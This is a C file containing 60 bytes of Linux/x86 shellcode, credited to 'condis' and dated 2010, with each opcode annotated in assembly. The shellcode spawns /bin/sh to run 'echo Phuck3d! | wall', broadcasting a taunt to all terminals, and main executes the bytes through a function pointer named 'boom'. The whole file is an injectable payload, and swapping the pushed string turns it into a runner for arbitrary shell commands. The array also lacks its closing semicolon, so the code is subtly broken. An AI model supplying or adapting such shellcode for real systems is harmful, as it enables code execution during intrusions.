/*

$Id: where-is-wallie.c, v 1.0 2010/04/24 18:32:29 condis Exp $

linux/x86 sends "Phuck3d!" to all terminals (60 bytes) shellcode
by condis

Tested on: Linux Debian

*/

int main(void)
{
	char evil[] =

		"\x6a\x0b"              // push   $0xb
		"\x58"                  // pop    %eax
		"\x99"                  // cltd
		"\x52"                  // push   %edx
		"\x68\x77\x61\x6c\x6c"  // push   $0x6c6c6177
		"\x68\x21\x20\x7c\x20"  // push   $0x207c2021
		"\x68\x63\x6b\x33\x64"  // push   $0x64336b63
		"\x68\x20\x50\x68\x75"  // push   $0x75685020
		"\x68\x65\x63\x68\x6f"  // push   $0x6f686365
		"\x89\xe6"              // mov    %esp,%esi
		"\x52"                  // push   %edx
		"\x66\x68\x2d\x63"      // pushw  $0x632d
		"\x89\xe1"              // mov    %esp,%ecx
		"\x52"                  // push   %edx
		"\x68\x2f\x2f\x73\x68"  // push   $0x68732f2f
		"\x68\x2f\x62\x69\x6e"  // push   $0x6e69622f
		"\x89\xe3"              // mov    %esp,%ebx
		"\x52"                  // push   %edx
		"\x56"                  // push   %esi
		"\x51"                  // push   %ecx
		"\x53"                  // push   %ebx
		"\x89\xe1"              // mov    %esp,%ecx
		"\xcd\x80"              // int    $0x80


	void(*boom)()=(void*)evil;
	boom();

  	return 0;
}